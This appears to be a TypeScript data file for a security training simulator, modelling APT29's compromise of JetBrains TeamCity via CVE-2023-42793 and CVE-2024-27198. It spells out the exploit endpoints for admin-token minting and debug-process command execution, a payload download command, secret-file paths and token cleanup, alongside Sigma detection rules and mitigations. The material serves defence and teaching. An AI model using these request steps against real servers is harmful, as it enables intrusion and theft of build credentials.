import type { AttackScenario } from '../types';

export const scenario: AttackScenario = {
  id: 'mandiant-apt29-teamcity-jetstream',
  code: 'CVE-2023-42793',
  name: 'Mandiant & CISA — APT29 (Midnight Blizzard): JetBrains TeamCity RCE & GraphicalProton',
  shortSubtitle: 'CISA AA23-347A / Mandiant · CVE-2023-42793 / CVE-2024-27198 Auth Bypass, Token Minting & OneDrive C2',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Detailed in Joint CISA/FBI/NSA/NCSC Advisory AA23-347A and Mandiant / Rapid7 threat research, Russian Foreign Intelligence Service (SVR / APT29 / Midnight Blizzard) actors exploited authentication bypass flaws in JetBrains TeamCity CI/CD servers (CVE-2023-42793 and CVE-2024-27198). Attackers minted an administrative access token via /app/rest/users/id:1/tokens/RPC2, enabled debug process execution (/app/rest/debug/processes), harvested CI/CD cloud secrets, and deployed the GraphicalProton backdoor using OneDrive for C2.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'CISA / FBI / NSA / NCSC Joint Advisory AA23-347A & Mandiant / Rapid7 Research',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (CVE-2023-42793 / CVE-2024-27198) · T1059 (TeamCity Debug RCE) · T1102.002 (OneDrive C2)',
    },
    {
      term: 'EXPLOIT ENDPOINTS',
      value: 'POST /app/rest/users/id:1/tokens/RPC2 -> POST /app/rest/debug/processes',
    },
    {
      term: 'APT29 IMPLANT',
      value: 'GraphicalProton (DLL Side-Loaded via Defender / Win32 Binary + OneDrive Graph API C2)',
    },
  ],
  nodes: [
    {
      id: 'apt29_svr_actor',
      label: 'APT29 (Midnight Blizzard)',
      sublabel: '198.51.100.91 (SVR Operator)',
      role: 'attacker',
      x: 15,
      y: 44,
      details: {
        osOrType: 'Russian SVR (APT29 / Cozy Bear) Infrastructure',
        pidOrPort: 'HTTP/S :8111 / :443 -> TeamCity Server',
        privilege: 'Unauthenticated External',
        artifacts: [
          'POST /app/rest/users/id:1/tokens/RPC2',
          'DELETE /app/rest/users/id:1/tokens/RPC2 (Token Cleanup)',
        ],
        description:
          'APT29 operator exploiting unauthenticated REST API endpoints on internet-exposed JetBrains TeamCity CI/CD servers.',
      },
    },
    {
      id: 'teamcity_cicd_srv',
      label: 'JetBrains TeamCity CI/CD',
      sublabel: '10.10.12.50:8111 (BUILD-TC-01)',
      role: 'victim_host',
      x: 44,
      y: 28,
      details: {
        osOrType: 'Windows Server 2022 · JetBrains TeamCity Server',
        pidOrPort: 'java.exe (Tomcat / TeamCity Service)',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'teamcity-javaLogging-*.log & teamcity-server.log',
          'internal.properties (rest.debug.processes.enable=true)',
        ],
        description:
          'Enterprise CI/CD build server compromised via CVE-2023-42793 / CVE-2024-27198.',
      },
    },
    {
      id: 'graphical_proton_implant',
      label: 'GraphicalProton Backdoor',
      sublabel: 'aclui.dll Side-Load + OneDrive C2',
      role: 'process',
      x: 54,
      y: 72,
      details: {
        osOrType: 'APT29 GraphicalProton C2 Implant (AA23-347A)',
        pidOrPort: 'PID 6740 · Side-Loaded aclui.dll',
        privilege: 'SYSTEM / Build Agent Admin',
        artifacts: [
          'Uses Microsoft OneDrive / Dropbox REST API for C2 Tasking',
          'whoami, netstat, systeminfo & AD Kerberos Ticket Collection',
        ],
        description:
          'APT29 custom backdoor deployed onto the TeamCity server that communicates over legitimate Microsoft Graph / OneDrive endpoints.',
      },
    },
    {
      id: 'cicd_secrets_repo',
      label: 'CI/CD Secrets & Prod Cloud Keys',
      sublabel: 'SSH Keys, kubeconfig & Signing Certs',
      role: 'server',
      x: 78,
      y: 30,
      details: {
        osOrType: 'Build Pipeline Secret Store & Source Control',
        pidOrPort: 'C:\\ProgramData\\JetBrains\\TeamCity\\config\\projects\\',
        privilege: 'Production Deployment Credentials',
        artifacts: [
          'credentials.json & params.xml (Encrypted Build Secrets)',
          'database.properties & Cloud Deployment Tokens',
        ],
        description:
          'TeamCity project configuration store containing production deployment keys and software signing certificates.',
      },
    },
    {
      id: 'cisa_splunk_siem',
      label: 'Enterprise SIEM & EDR',
      sublabel: 'teamcity-server.log & Sysmon EID 1',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'SOC SIEM & Endpoint Detection',
        pidOrPort: 'TeamCity Access Logs & Sysmon EID 1 / 7',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Alert: CVE-2023-42793 /app/rest/users/id:1/tokens/RPC2 Request',
          'Alert: java.exe Spawning Shell via /app/rest/debug/processes',
        ],
        description:
          'Monitors TeamCity access logs for token creation on user id:1 and java.exe child processes.',
      },
    },
  ],
  processTree: [
    {
      pid: 2240,
      ppid: 680,
      name: 'java.exe (TeamCity Server)',
      commandLine: 'C:\\TeamCity\\jre\\bin\\java.exe -Dcatalina.base=C:\\TeamCity ...',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'RequestInterceptor.preHandle() [Auth Bypassed]',
        'ProcessBuilder("/app/rest/debug/processes").start()',
      ],
    },
    {
      pid: 6740,
      ppid: 2240,
      name: 'Defender.exe (GraphicalProton)',
      commandLine: 'C:\\Windows\\Temp\\Defender.exe (Side-loads malicious aclui.dll)',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: [
        'LoadLibraryW("aclui.dll")',
        'WinHttpConnect("graph.microsoft.com")',
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'TEAMCITY REST API AUTH BYPASS & TOKEN MINTING (CVE-2023-42793)',
      subtitle: 'POST /app/rest/users/id:1/tokens/RPC2 mints SuperAdmin Bearer token',
      description:
        'As documented in CISA AA23-347A, the TeamCity RequestPermissionsInterceptor fails to authenticate requests matching /app/rest/users/id:1/tokens/RPC2 (CVE-2023-42793) or matrix parameter paths /hax?jsp=/app/rest/users;.jsp (CVE-2024-27198). APT29 sends a single HTTP POST to mint an administrative Bearer token for user id:1.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['apt29_svr_actor', 'teamcity_cicd_srv', 'cisa_splunk_siem'],
      compromisedNodeIds: ['teamcity_cicd_srv'],
      keySpecs: [
        { term: 'VULNERABILITIES', value: 'CVE-2023-42793 & CVE-2024-27198 (TeamCity Auth Bypass)' },
        { term: 'TOKEN ENDPOINT', value: 'POST /app/rest/users/id:1/tokens/RPC2' },
        { term: 'CLEANUP STEP', value: 'DELETE /app/rest/users/id:1/tokens/RPC2 immediately after RCE' },
      ],
    },
    {
      index: 2,
      title: 'DEBUG PROCESS RCE & CI/CD SECRET HARVESTING',
      subtitle: 'Enabling rest.debug.processes.enable and executing commands via java.exe',
      description:
        'Authenticating with the minted Bearer token, APT29 modifies internal.properties to set rest.debug.processes.enable=true and invokes POST /app/rest/debug/processes?exePath=cmd.exe, executing arbitrary commands as NT AUTHORITY\\SYSTEM and dumping TeamCity project secrets (credentials.json) and database.properties.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059.003',
      mitreTechniqueName: 'Command and Scripting Interpreter: Windows Command Shell',
      activeNodeIds: ['apt29_svr_actor', 'teamcity_cicd_srv', 'cicd_secrets_repo', 'cisa_splunk_siem'],
      compromisedNodeIds: ['teamcity_cicd_srv', 'cicd_secrets_repo'],
      keySpecs: [
        { term: 'RCE ENDPOINT', value: 'POST /app/rest/debug/processes?exePath=cmd.exe&params=/c+...' },
        { term: 'PARENT PROCESS', value: 'C:\\TeamCity\\jre\\bin\\java.exe (NT AUTHORITY\\SYSTEM)' },
        { term: 'HARVESTED SECRETS', value: 'config\\projects\\*\\pluginData\\secure\\credentials.json' },
      ],
    },
    {
      index: 3,
      title: 'GRAPHICALPROTON IMPLANT & ONEDRIVE GRAPH API C2',
      subtitle: 'Deploying DLL side-loaded GraphicalProton communicating via Microsoft OneDrive',
      description:
        'To maintain stealthy long-term access after deleting the RPC2 token, APT29 deploys GraphicalProton (a trojanized aclui.dll side-loaded by a signed binary) which uses legitimate Microsoft OneDrive / Graph API endpoints for encrypted Command and Control (T1102.002).',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1102.002',
      mitreTechniqueName: 'Web Service: Bidirectional Communication',
      activeNodeIds: ['teamcity_cicd_srv', 'graphical_proton_implant', 'cisa_splunk_siem'],
      compromisedNodeIds: ['teamcity_cicd_srv', 'cicd_secrets_repo', 'graphical_proton_implant'],
      keySpecs: [
        { term: 'BACKDOOR FAMILY', value: 'GraphicalProton (APT29 / Midnight Blizzard)' },
        { term: 'C2 TRANSPORT', value: 'Microsoft Graph / OneDrive REST API (api.onedrive.com)' },
        { term: 'CISA ADVISORY', value: 'AA23-347A (SVR Exploitation of JetBrains TeamCity)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'man-tc-1',
      no: 1,
      stageIndex: 1,
      timestamp: '22:14:03.118',
      sourceNodeId: 'apt29_svr_actor',
      targetNodeId: 'teamcity_cicd_srv',
      sourceLabel: '198.51.100.91',
      targetLabel: 'TeamCity :8111',
      sourceType: 'NETWORK',
      protocolOrEventId: 'TeamCity Access Log',
      shortAction: 'MINT RPC2 TOKEN',
      info: 'POST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1 -> 200 OK (Admin Token Created)',
      sizeOrCode: 'CVE-2023-42793',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'CISA AA23-347A highlights that CVE-2023-42793 exploitation is logged in TeamCity access logs as an unauthenticated POST to /app/rest/users/id:1/tokens/RPC2.',
      rawLog: `198.51.100.91 - - [13/Nov/2024:22:14:03 +0000] "POST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1" 200 142 "-" "Mozilla/5.0"
198.51.100.91 - - [13/Nov/2024:22:14:04 +0000] "POST /admin/dataDir.html?action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true HTTP/1.1" 200 -
198.51.100.91 - - [13/Nov/2024:22:14:08 +0000] "DELETE /app/rest/users/id:1/tokens/RPC2 HTTP/1.1" 204 -`,
      detectionRule: {
        type: 'SIGMA',
        title: 'CISA AA23-347A — JetBrains TeamCity Auth Bypass Token Creation (CVE-2023-42793)',
        ruleCode: `title: JetBrains TeamCity Unauthenticated Admin Token Creation
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem|contains:
      - '/app/rest/users/id:1/tokens'
      - '/app/rest/debug/processes'
      - ';.jsp'
  condition: selection
level: critical`,
        mitigation:
          'Upgrade JetBrains TeamCity to patched versions fixing CVE-2023-42793 and CVE-2024-27198 and never expose CI/CD management ports directly to the internet.',
      },
    },
    {
      id: 'man-tc-2',
      no: 2,
      stageIndex: 2,
      timestamp: '22:14:05.490',
      sourceNodeId: 'teamcity_cicd_srv',
      targetNodeId: 'cicd_secrets_repo',
      sourceLabel: 'java.exe (TeamCity)',
      targetLabel: 'cmd.exe / debug/processes',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1',
      shortAction: 'TEAMCITY DEBUG RCE',
      info: 'ParentImage=C:\\TeamCity\\jre\\bin\\java.exe CommandLine="cmd.exe /c curl -o C:\\Windows\\Temp\\Defender.exe ..."',
      sizeOrCode: 'PID 6740',
      severity: 'CRITICAL',
      mitreId: 'T1059.003',
      explanation:
        'Invoking /app/rest/debug/processes causes the TeamCity java.exe server process (not a build agent) to spawn cmd.exe / powershell.exe.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>1</EventID>
    <Computer>BUILD-TC-01.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="ProcessId">6740</Data>
    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c C:\\Windows\\Temp\\Defender.exe</Data>
    <Data Name="ParentProcessId">2240</Data>
    <Data Name="ParentImage">C:\\TeamCity\\jre\\bin\\java.exe</Data>
    <Data Name="User">NT AUTHORITY\\SYSTEM</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'JetBrains TeamCity Server Spawning Suspicious Shell Process',
        ruleCode: `title: TeamCity Server Java Process Spawning Shell
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|contains: '\\TeamCity\\'
    ParentImage|endswith: '\\java.exe'
    Image|endswith:
      - '\\cmd.exe'
      - '\\powershell.exe'
      - '\\whoami.exe'
  condition: selection
level: critical`,
        mitigation:
          'Rotate all secrets, SSH keys, and code-signing certificates stored in TeamCity config\\projects\\*\\pluginData\\secure\\.',
      },
    },
    {
      id: 'man-tc-3',
      no: 3,
      stageIndex: 3,
      timestamp: '22:14:11.820',
      sourceNodeId: 'graphical_proton_implant',
      targetNodeId: 'cisa_splunk_siem',
      sourceLabel: 'Defender.exe (PID 6740)',
      targetLabel: 'aclui.dll -> OneDrive C2',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 7 & 3',
      shortAction: 'GRAPHICALPROTON C2',
      info: 'Image=C:\\Windows\\Temp\\Defender.exe ImageLoaded=C:\\Windows\\Temp\\aclui.dll -> api.onedrive.com:443',
      sizeOrCode: 'OneDrive C2',
      severity: 'HIGH',
      mitreId: 'T1102.002',
      explanation:
        'CISA AA23-347A details APT29 side-loading aclui.dll (GraphicalProton) and polling Microsoft OneDrive APIs for C2 tasking.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>7</EventID>
    <Computer>BUILD-TC-01.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="Image">C:\\Windows\\Temp\\Defender.exe</Data>
    <Data Name="ImageLoaded">C:\\Windows\\Temp\\aclui.dll</Data>
    <Data Name="Signed">false</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'APT29 GraphicalProton aclui.dll Side-Loading (CISA AA23-347A)',
        ruleCode: `title: APT29 GraphicalProton DLL Side-Loading of aclui.dll
logsource:
  category: image_load
  product: windows
detection:
  selection:
    ImageLoaded|endswith: '\\aclui.dll'
    Signed: 'false'
  condition: selection
level: critical`,
        mitigation:
          'Block unsigned aclui.dll loads outside C:\\Windows\\System32\\ and restrict outbound connections from build servers to cloud storage APIs.',
      },
    },
  ],
};
